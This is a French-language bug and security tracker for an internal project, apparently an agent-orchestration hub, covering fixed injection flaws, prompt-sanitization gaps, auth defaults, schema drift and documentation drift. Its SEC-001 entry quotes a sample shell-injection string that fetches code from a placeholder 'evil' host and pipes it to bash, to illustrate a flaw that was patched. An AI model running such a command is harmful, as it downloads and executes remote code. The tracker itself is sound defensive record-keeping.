# Bugs — ALNUA Hub

> Créé le 2026-07-25 lors du bootstrap de gouvernance, alimenté par un audit sécurité
> + un audit qualité de code menés en parallèle (voir `docs/classeur/doc-audit.md` pour le détail de
> la méthode). Convention : `SEC-XXX` pour la sécurité, `BUG-XXX` pour le reste.

## Corrigés (2026-07-25)

| ID | Gravité | Description | Correctif |
|----|---------|-------------|-----------|
| SEC-001 | **Critique** | `POST /ide/run` (`services/ide_workspace.py::run_sandbox_command`) — `subprocess.run(cmd, shell=True)` avec allowlist par préfixe (`startswith`) : les métacaractères shell (`;`, `&&`, `\|`, backticks) passaient après un préfixe autorisé (ex. `echo x && curl evil/x\|bash`), et un `pytest-evil` passait le filtre par préfixe | Rejet des commandes contenant `; & \| \` $ < > \n \r`, et comparaison du premier token **exact** (plus de `startswith`) contre l'allowlist. Vérifié : commandes légitimes passent, injection et bypass de préfixe bloqués (test manuel), `ruff` clean |
| SEC-004 | Moyenne | `POST /sav/ask` (`bots/sav_bot.py::handle_question`) — texte libre client inséré dans le prompt LLM sans passer par `sanitize_user_input`, contrairement au pattern systématique de `agents_pole.py` | `question = sanitize_user_input(question, max_length=2000)` avant construction du prompt |
| SEC-005 | Moyenne | `POST /agents/brainstorm` et `/agents/brainstorm/chat` (`api/routers/releases.py`) — `topic`, `context_notes`, `message` transmis à `BrainstormAgent` sans sanitization | Ajout d'un helper `_clean()` (même pattern que `agents_pole.py::_clean`) appliqué aux 3 champs |
| SEC-006 | Moyenne | `services/trend_monitor.py::_llm_synthesize_trends` — titres bruts HackerNews/Reddit/GitHub (contenu externe non fiable, contrôlé par n'importe qui sur ces plateformes) interpolés tels quels dans le prompt de synthèse LLM | `sanitize_user_input(item.title, max_length=300)` (strip_injection actif par défaut) avant assemblage du prompt |
| BUG-001 | Faible | `agents/rnd_agent.py::__init__` et `agents/rnd_social_agent.py::__init__` redéfinissaient `__init__` sans appeler `super().__init__()` — violation de la règle invariante `AgentBase` (voir `CLAUDE.md`). Sans impact fonctionnel aujourd'hui (les deux assignaient manuellement les mêmes attributs que `AgentBase`), mais silencieusement fragile si `AgentBase.__init__` gagne un attribut | `super().__init__(db, llm)` / `super().__init__()` en première ligne, imports `get_supabase`/`LLMClient` devenus inutiles retirés. Suite complète (354 passed, 6 skipped) + `ruff` verts après coup |

## Corrigés (2026-07-25, suite — décision Emilie)

| ID | Gravité | Description | Correctif |
|----|---------|-------------|-----------|
| SEC-002 | **Haute** | Mode "dev ouvert" par défaut : `HUB_API_KEY` avait pour défaut `""`, et l'API démarrait quand même en dev — accès libre silencieux si un déploiement oubliait `ENVIRONMENT`/`HUB_API_KEY` | `config/settings.py::_validate_security` lève désormais une erreur au démarrage si `HUB_API_KEY` est vide, **quel que soit** `ENVIRONMENT` — plus de bypass dev. `api/middleware.py` simplifié en conséquence (suppression de `_hub_key_enforcement_enabled()` et du warning devenus morts). Voir `DECISIONS.md` DEC-010 pour le détail et les effets de bord traités (`.env.example`, `README.md`, `tests/test_devex_phase6.py` réécrit) |
| SEC-003 | Basse *(downgradée)* | `POST /agents/embedded/pi-command` — denylist best-effort sur les commandes SSH Pi, dépendait entièrement de SEC-002 pour être exploitable sans authentification | **Mitigée par SEC-002** : sans `HUB_API_KEY` valide, cet endpoint n'est plus atteignable du tout. Le filtrage par denylist lui-même (`skills/skill_pi_ssh.py`) n'a pas changé — reste un risque résiduel documenté dans le code (*"trust boundary, not a sandbox"*), accepté tant qu'un attaquant a besoin de la clé pour l'atteindre |
| DEC-009 | — | `skills/skill_nwiro.py` (UE5) contredisait la règle "Pas d'UE5" de `CLAUDE.md` | Tranché par Emilie : Nwiro/UE5 est un choix assumé, coexiste avec Godot. `CLAUDE.md` corrigé, aucun changement de code. Voir `DECISIONS.md` DEC-009 |

Suite de tests complète (`pytest tests/ -q` — 355 passed, 6 skipped) et `ruff check
agents/ services/ api/ config/ database/ bots/ skills/` **verts après SEC-002 aussi**,
y compris `tests/test_devex_phase6.py` réécrit pour le nouveau comportement.

## Corrigés (2026-07-30)

| ID | Gravité | Description | Correctif |
|----|---------|-------------|-----------|
| BUG-006 | Moyenne | `database/supabase_client.py::get_supabase()` (singleton `lru_cache`, process-lifetime) — la connexion HTTP/2 sous-jacente peut être fermée côté serveur Supabase après une période d'inactivité ; httpx ne le découvre qu'en tentant de la réutiliser, ce qui levait `httpx.RemoteProtocolError: Server disconnected` de façon intermittente sur `select`/`insert`/`insert_many`/`update`/`delete` — vu en 500 aléatoires sur `/projects`, `/tickets`, `/modules`, `/posts`, `/brand/kits` pendant la QA de la Phase 14 (ROADMAP.md) | `_execute_with_retry()` : reconstruit et ré-exécute la requête une fois si `httpx.RemoteProtocolError` est levée — la connexion morte est alors abandonnée par le pool httpx et une nouvelle s'ouvre pour la tentative suivante. `ruff` vert |
| BUG-007 | **Haute** | La table `roadmap` en production a dérivé de `database/schema.sql` : `priority` y est un `INTEGER` (défaut `0`) et le `CHECK` sur `status` n'a jamais inclus `'idea'` — alors que `api/schemas.py::RoadmapCreate`/`RoadmapUpdate`, `agents/pm_agent.py`, et l'UI `/roadmap` envoient et valident systématiquement un label texte (`critical`/`high`/`medium`/`low`) et le statut `idea`. Conséquence : `POST /roadmap` échouait à 100% dès qu'un statut ou une priorité était transmis (500 `invalid input syntax for type integer` ou violation `roadmap_status_check`) — jamais remarqué faute d'avoir déjà créé un item roadmap en prod (0 lignes constatées). Trouvé en implémentant la Phase 15 (décisions en attente réelles, qui repose sur `status IN (idea, planned)`). En creusant, deux colonnes documentées dans `schema.sql`/`RoadmapItem` (TS) manquaient aussi réellement : `updated_at` (jamais créée, pas de trigger) et `linked_ticket_id` (utilisée par `POST /roadmap/from-ticket/{ticket_id}` et son check anti-doublon — donc cet endpoint aussi 100% cassé, colonne inconnue de PostgREST) | `supabase/migrations/20260730140000_roadmap_status_priority_fix.sql` — CHECK statut élargi à `idea`, colonne `priority` migrée `INTEGER → TEXT` (conversion par bucket pour compat si des lignes existaient) + nouveau `CHECK` texte. `supabase/migrations/20260730150000_roadmap_missing_columns.sql` — ajout `updated_at` (+ trigger `trg_roadmap_updated_at`, même pattern que `tickets`) et `linked_ticket_id` (FK vers `tickets`, `ON DELETE SET NULL`) + index. `database/schema.sql` mis à jour en cohérence (trigger ajouté à la doc). Aucune ligne réelle affectée (table vide avant les deux migrations). `api/schemas.py`/`agents/pm_agent.py` n'ont eu besoin d'aucun changement — ils validaient déjà le bon format, c'est la base qui était en retard. Vérifié en direct : create/update (trigger `updated_at` confirmé) + `POST /roadmap/from-ticket/{id}` (création + 409 anti-doublon) fonctionnent désormais de bout en bout |

## Corrigés (2026-07-31)

| ID | Gravité | Description | Correctif |
|----|---------|-------------|-----------|
| BUG-008 | **Haute** | `services/agent_wake.py::get_pipeline_status()` (alimente le panneau "Académie ALNUA" et l'IDE Hub) rapportait `verdict="working"` ("N issue(s) en file — prise en charge sous ~60s" / "en cours de codage") dès qu'une issue GitHub Academy portait le label `agent-ready`/`in-pipeline` — sans jamais vérifier que `REPO_PATH_ACADEMY` existe réellement en local. Or `skill_gh_issues.py::process_issue()` échoue et retourne avant même de poser le label `in-pipeline` quand ce chemin n'existe pas (`target.local_path.is_dir()` false) — l'issue reste donc bloquée sur `agent-ready` indéfiniment, sans jamais coder quoi que ce soit, alors que l'UI affichait en boucle "ça arrive dans ~60s". Signalé par Emilie : "ça me dit que [Théo] travaille, mais je ne vois rien... 0%". Cause racine confirmée en prod : `REPO_PATH_ACADEMY=C:\Dev\alnua-academy` ne pointe vers aucun dossier existant sur cette machine — 5 issues (3 `agent-ready` + 2 `in-pipeline`) bloquées en silence au moment du diagnostic | `get_pipeline_status()` vérifie désormais `target.local_path.is_dir()` **avant** de conclure `verdict="working"` sur `agent-ready`/`in-pipeline` — si le chemin local manque, retourne `verdict="stuck"` avec un message explicite ("Chemin local introuvable : ... — clone le repo ou configure REPO_PATH_ACADEMY (N issue(s) bloquée(s))"), plus `repo_path_exists` exposé dans la réponse. Aucun changement frontend nécessaire : `AcademyCockpit` gérait déjà le style "stuck" (orange), il ne recevait juste jamais le bon verdict. Vérifié en direct contre les vraies données de prod (5 issues réellement bloquées) et dans le navigateur — la carte "Théo (dev_app)" passe de vert/"travaille" à orange/"bloqué" avec le message correct. `ruff` vert. Volet externe résolu le 2026-07-31 : `emiliegrade-afk/alnua-academy` cloné dans `C:\Dev\alnua-academy` (accord Emilie), token retiré de `.git/config` après clonage. `GET /academy/pipeline` confirme `repo_path_exists=true` et `verdict="working"`. Les 3 issues passées `agent-failed` entre-temps (tentatives automatiques pendant l'absence du repo) ont été relancées via `POST /academy/wake` — `agent_failed` retombé à 0, les 5 issues initialement bloquées sont réparties `in_pipeline: 3` / `agent_ready: 2` |
| BUG-009 | Moyenne | `api/middleware.py::rate_limit_middleware` (`api_limiter`, 120 req/min par IP, `services/rate_limiter.py`) s'applique à tout le trafic non-exempté **avant** que `hub_api_key_middleware` ne valide la clé (ordre réel d'exécution FastAPI : le dernier middleware enregistré dans `register_middleware()` s'exécute en premier — `hub_api_key_middleware` d'abord, donc en pratique tout ce qui atteint `rate_limit_middleware` sur un chemin non-exempté est déjà authentifié). Or le Hub est un outil interne mono-utilisateur (Emilie), pas une API publique multi-tenant : une seule page comme l'ancien `/rd` déclenche ~25-50 appels authentifiés en parallèle (doublés par le mode strict de React en dev) — largement de quoi épuiser 120/min sans le moindre abus. Reproduit en direct : ouvrir un dossier via le nouveau lien "Ouvrir ↗" de la table Dossiers (Phase 27, ROADMAP.md) déclenchait "Rate limit API atteint." + un faux bandeau "Backend inaccessible" après 2-3 navigations rapides, y compris juste après un redémarrage propre du backend (compteur à zéro) — donc pas seulement un artefact du testing intensif de cette session, un cas réel d'usage normal | `rate_limit_middleware` vérifie désormais `hub_api_key_valid(request.headers.get("X-Hub-Key"))` et saute `api_limiter` si la clé est valide — `assistant_limiter` (contrôle de coût LLM/OpenRouter, pas de charge backend) reste inchangé. Vérifié en direct : 150 requêtes authentifiées rapides → 0/150 en 429 (avant : blocage systématique après quelques secondes) ; 150 requêtes sans clé → 150/150 rejetées en 401 par `hub_api_key_middleware` (donc déjà bloquées en amont, aucune régression de sécurité — ce trafic n'atteignait de toute façon jamais les routes protégées) ; 3 rechargements rapprochés de `/rd?dossier=...` (le scénario exact qui cassait) → plus aucun bandeau rate-limit. `ruff` vert |
| BUG-010 | Faible | Une fois BUG-009 corrigé, Emilie a signalé qu'ouvrir un dossier via "Ouvrir ↗" affichait quand même "une fenêtre pop-up... tout est grisé, je ne sais rien faire". Cause : `web/src/components/rnd/rnd-pitch-modal.tsx` (`!idea && loading`) affiche une boîte de dialogue minimale (juste un spinner, aucun texte) pendant que `fetchRndDossier()` charge — reproduit en direct avec la commande `wait` du skill `browse` pour capturer précisément cet état : boîte sombre, spinner seul, rien d'autre à l'écran. Un bouton fermer (X) existe bel et bien (`DialogContent` l'inclut par défaut) et **fonctionne** (testé : clic → dialogue fermé), donc pas un bug de blocage réel — mais rien n'indique que c'est un chargement en cours plutôt qu'un état cassé, et le X est petit/peu visible sur un fond entièrement sombre | Ajout du texte "Chargement du dossier… (peut prendre quelques secondes)" sous le spinner dans cette branche. `tsc`/`eslint` propres. Vérifié en direct (capture de l'état exact avant/après + clic sur le X confirmé fonctionnel). Cause de la lenteur elle-même non traitée ici (page `/rd` historique, hors périmètre) : chargement du dossier en quelques secondes à ~10s selon la charge, cohérent avec le volume de requêtes concurrentes de cette page déjà documenté en BUG-009 |

## Corrigés (2026-08-09 — Phase A remédiation Audit 002)

| ID | Gravité | Description | Correctif |
|----|---------|-------------|-----------|
| BUG-011 | **Haute** | Dérive de gouvernance : CHANGELOG figé au 2026-07-31 ; IMPLEMENTATION_STATUS / ARCHITECTURE / AGENTS / TESTING / README avec comptes obsolètes (27 agents, 35 routers, 63 tests) ; SPEC_WORKFLOW_ENGINE en retard sur `sav_lite`/`ship_*` | Catch-up CHANGELOG (Phases 22-38, DEC-011–016, ops, Audit 002) ; resync IMPLEMENTATION_STATUS ; comptes 49 / 38 / ~67·381 ; README nettoyé + `HUB_API_KEY` en table ; SPEC alignée ; règle anti-drift CHANGELOG dans `AGENTS.md` |
| BUG-013 | Moyenne | Routes primaires `/finances`, `/marketing`, `/rd` (et app/gaming/robo) servaient `MockupDepartmentPage` alors que l'UI live est sous `*-v2` | Phase B : ré-exports vers `*-v2` ; `/rd` = `rnd-v2` + `RdPageContent`. Suite clean 2026-08-09 : `/ceo` `/secretary` `/brand` live. **Reste mockup :** `/hub` `/analytics` |
| BUG-002 | Info | `data/agent_models.json` tracké alors qu'il est dans `.gitignore` | Phase C : `git rm --cached` — plus suivi ; fichier local intact |
| BUG-003 | Info | `fastapi-mcp==0.4.0` absent de `requirements.lock.txt` | Phase C : ligne ajoutée au lock depuis le venv (`0.4.0`) |
| BUG-012 | Moyenne | `npm audit` : 21 vulns dont 1 critical vitest | Phase C : critical fermée (vitest 4.1.10) ; postcss 8.5.26 + overrides ; **reste 8** (5 high Next 14 — accepté jusqu’à upgrade majeur documenté) |
| BUG-016 | Info | Explosion vault library (~988 notes) | Phase C : RETENTION.md + gitignore `vault/obsidian/library/**` sauf `_index/` |
| BUG-014 | Info | Modules morts : `skill_aider` / `skill_openhands` / `brand_agent` | Phase D : skills orphans **supprimés** ; `brand_agent` **gardé** (Phase 35 / SPEC / `test_pole_services`) |
| BUG-015 | Info | Dual coding + triple briefing | Phase D : dual engines documentés ; Vague 4 : `coding_facade.py` orphelin **supprimé** — appeler `skill_coding_agent` / `skill_code_agent` ; `briefing_facade` (3 chemins) inchangé |
| BUG-005 | Info | `AGENT_NAME` suffixe `_agent` vs IDs courts | Phase D : aliases `rnd_*_agent` ajoutés ; `coo_agent`→`coo` existait déjà |
| BUG-013 | Moyenne | Routes mockup restantes | Suite clean : `/hub` `/analytics` live (DeptV2 shells) — **plus de MockupDepartmentPage** sur routes primaires |
| BUG-018 | Faible | Micro-drift docs post-Audit 003 (même jour) : README/ARCHITECTURE/TESTING/IMPLEMENTATION_STATUS encore « Next.js 14 » et « ~381 tests » alors que `web/package.json` = Next **15.5.23** et `pytest --collect-only` = **392** ; ROADMAP « Current phase » proposait encore Audit 003 ; DOC_AUDIT 003 listait des mockups déjà reconnectés | Audit 004 : resync Next 15 + comptes tests + ROADMAP blurb + stats ; règle anti-drift rappelée |
| BUG-017 | Info | Next / sharp vulns (npm audit highs) | Vague 1 : upgrade Next **15.5.23 → 16.3.0** + eslint 9 + `eslint.config.mjs` ; override `dompurify` 3.4.13 ; `npm audit` = **0** vulns ; `build:safe` + tsc + vitest 35 verts |
| BUG-019 | Moyenne | WIP local dirty sur /finances + /marketing (mockup puis draft pole-dashboard) risquait une régression vs ré-exports *-v2 live | Vague 0 : arbre live `*-v2` ; WIP stashé. **P0 DEC-019 (2026-08-09) :** stash jeté — pas de reprise pole-dashboard sans nouvelle DEC |

## Corrigés (2026-08-09 — BUG-004 hotspots)

| ID | Gravité | Description | Correctif |
|----|---------|-------------|-----------|
| BUG-004 | Info | Fichiers Python >300 lignes (hotspots trackés) | Façades + modules par pôle : `agent_specs_registry` → `agent_specs_*.py` (~23 lignes façade, 45 specs) ; `agent_personas` → `personas_*.py` (~112 lignes façade, 49 personas) ; `rnd_center` → `rnd_center_{llm,store,observe,pipeline,library}.py` (~153 lignes façade). Modules split ≤300. Tests library patchés sur modules d’implémentation. `ruff` + `pytest` 401 passed / 6 skipped. **Dette résiduelle** : ~60 autres fichiers >300 (`api/schemas.py`, `api/routers/rnd.py`, etc.) — hors ticket ; ne pas grossir davantage. |

## Corrigés (2026-09-07 — Audit 005)

| ID | Gravité | Description | Correctif |
|----|---------|-------------|-----------|
| SEC-007 | Moyenne | `agents/secretary_instruction.py::handle_instruction` (point d'entrée partagé Telegram/Hub/desktop) route vers `agents/secretary_handlers_ops.py::_handle_conversation`, qui interpole `instruction` **brut** dans le prompt LLM sans passer par `sanitize_user_input`. Les bots Telegram sanitizaient côté handler avant l'appel, mais le nouveau client `nadia_desktop/core/hub_bridge.py::HubBridge.chat()` (feature "Spark") appelait `handle_instruction(message, ...)` directement, sans aucune sanitization amont | `handle_instruction` sanitize désormais lui-même en entrée (`sanitize_user_input(..., max_length=4000, redact_pii_enabled=False)` — PII désactivée comme les autres endpoints secretary, cf. DEC-007) : protège tous les appelants actuels et futurs au même point d'entrée, pas seulement Telegram. Vérifié : import sans cycle, suite complète verte |
| BUG-020 | Faible | `tests/test_telegram_voice.py::test_build_voice_bytes_uses_tts` — mock `lambda text: b"ID3fake"` sans le kwarg `agent_id` réellement passé par `services/telegram_voice.py::build_voice_bytes`. Bug de test, pas de régression prod | Mock corrigé : `lambda text, agent_id="secretary": b"ID3fake"` |
| BUG-021 | Moyenne | `department-routes-live.test.ts` attendait `CeoMorningBriefCard`/`SiegeLifeLinks` littéralement dans `/ceo/page.tsx` et `SiegeLifeLinks` dans `/secretary/page.tsx` — désynchronisé depuis que la refonte siège a déplacé ces éléments dans `CeoCommandView`/`SecretaryCommandView` | Test mis à jour pour vérifier `CeoCommandView`/`SecretaryCommandView` dans les pages + `SiegeLifeLinks` dans ces command views. `web/src/components/ceo/ceo-morning-brief-card.tsx` supprimé (orphelin confirmé — plus référencé nulle part, fonctionnalité équivalente déjà dans `CeoCommandView`) |
| BUG-022 | Moyenne | `npm audit` (web) : 4 vulnérabilités (2 high, 1 moderate, 1 low) — régression vs 0 (Vague 1) | `npm audit fix` → **0** vulnérabilité. `tsc --noEmit` et vitest revérifiés verts après |
| BUG-023 | **Haute** | Dérive de gouvernance : `ALL_ROUTERS` réel = **86** vs **40** documenté ; `AGENT_PERSONAS` 53 réel vs 50 documenté (`implementation-status.md`) ; `CHANGELOG.md` (non committé) arrêté au 2026-08-14 alors que des features entières postérieures n'étaient journalisées nulle part | `README.md` / `ROADMAP.md` / `docs/classeur/implementation-status.md` resync (86 routers, 53 personas) ; `CHANGELOG.md` rattrapé (entrée 2026-09-07 groupant Agent Lounge, Nadia Desktop/Spark, vocal Telegram, Security Sentinel patrol, services de fond, + ce lot de correctifs) |

## Ouverts — trouvés lors de l'Audit 005 (2026-09-07)

| ID | Gravité | Description | Constat |
|----|---------|-------------|-----------|
| BUG-024 | **Haute** | Hygiène git : dernier commit `ba841ad` le **2026-08-11** (27 jours avant cet audit) — ~240 fichiers trackés modifiés/supprimés + non trackés constituant des features entières (Agent Lounge, Nadia Desktop "Spark", vocal Telegram, Security Sentinel, schémas Studio) jamais poussées sur `origin/main` | En cours de traitement dans ce même lot : commit par lots logiques (fixes Audit 005 / gouvernance / features accumulées) puis push — à clore une fois `git push` confirmé |

## Ouverts — nécessitent une décision produit, non corrigés

| ID | Gravité | Description | Constat |
|----|---------|-------------|-----------|
| — | — | Aucun bug ouvert tracké | Hygiène fichiers >300 fermée (paydown 2026-08-10) |

## Statistiques (mises à jour Audit 005 — 2026-09-07)

| Bucket | Count |
|--------|------:|
| Ouverts | **1** (BUG-024 — en cours de clôture, commit/push ce lot) |
| Fermés remédiation + Vague 0–4 + BUG-004 + Audit 005 | 20 (+ `BUG-004`) |
| Routers / Personas (resync Audit 005) | **86** / **53** |
| pytest | **638** passed / 6 skipped / **0 failed** |
| Vitest (web) | **42** passed / **0 failed** |
| ruff / tsc --noEmit | ✅ 0 erreur (les deux) |
| npm audit (web) | **0** vuln (`npm audit fix` appliqué) |
| Python >300 lignes | **0** (packages agents/services/api/skills/bots/config/database) — tenu depuis Vague 5 DEC-032 |
| Residual mockup routes (working tree) | **0** |
| Corrigés (SEC) | 7 (`SEC-001`–`007`) |
| Corrigés (BUG) | 23 (`BUG-001`–`023`) |
| Décision fermée | 1 (`DEC-009`) |

## Vérifié sans anomalie (audit sécurité, pour mémoire)

Secrets en dur, `.env` commité, injection SQL, CORS wildcard+credentials, path
traversal, logs qui fuient des secrets, contrôle d'accès sur `/mcp` et endpoints de
mutation — voir le détail dans `docs/classeur/doc-audit.md`, audit 001.
